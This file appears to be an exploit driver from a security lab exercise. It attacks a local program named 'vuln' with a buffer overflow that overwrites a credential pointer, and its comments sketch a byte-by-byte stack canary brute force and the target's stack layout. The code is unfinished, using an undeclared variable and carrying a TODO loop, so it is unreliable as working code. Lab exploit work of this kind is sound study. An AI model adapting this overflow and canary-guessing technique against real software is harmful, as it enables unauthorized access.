#include "driver_base.c"

int main() {
    char *nargv[3];
    nargv[0] = "vuln";
    nargv[1] = STRINGIFY(GRP);
    nargv[2] = NULL;


    create_subproc("./vuln", nargv);
    fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
            "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
            "to continue with the exploit\n");

    getchar();
    get_formatted("%*s"); //Needed to clear out the Welcome message

    put_str("p 1234567\n");
    send();
    get_formatted("%*s");

    unsigned explsz = auth_db_cred_dist + 8 - 8 + 8 + i;
    void* *expl = (void**)malloc(explsz);
    memset((void*)expl, 0x01, explsz);

    put_str("u ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
    get_formatted("%*s");
    put_str("l \n");
    send();

    usleep(100000);
    get_formatted("%*s");

    kill(pid, SIGINT);

    int status;
    wait(&status);

    if (WIFEXITED(status)) {
        fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
    } 
    else if (WIFSIGNALED(status)) {
        printf("vuln killed by signal %d\n", WTERMSIG(status));
    } 
    else if (WIFSTOPPED(status)) {
        printf("vuln stopped by signal %d\n", WSTOPSIG(status));
    } 
    else if (WIFCONTINUED(status)) {
        printf("vuln continued\n");
    }

    return 0;
}


// iterate over each byte of the canary
// for(int i = 1; i <= 8; i++) {
//     uint64_t current_byte = 0x00;
//     while(true) {    // TODO: Fix condition
//         unsigned explsz = auth_db_cred_dist + 8 - 8 + 8 + i;
//         void* *expl = (void**)malloc(explsz);
//         memset((void*)expl, current_byte, explsz);
//     }
// }

/*


      <return addr - cred>
rbp   <g's rbp> 
      canary (stack canary)
      cred addr -> 000000
      db -> 000000



      cred -> 1234567_

*/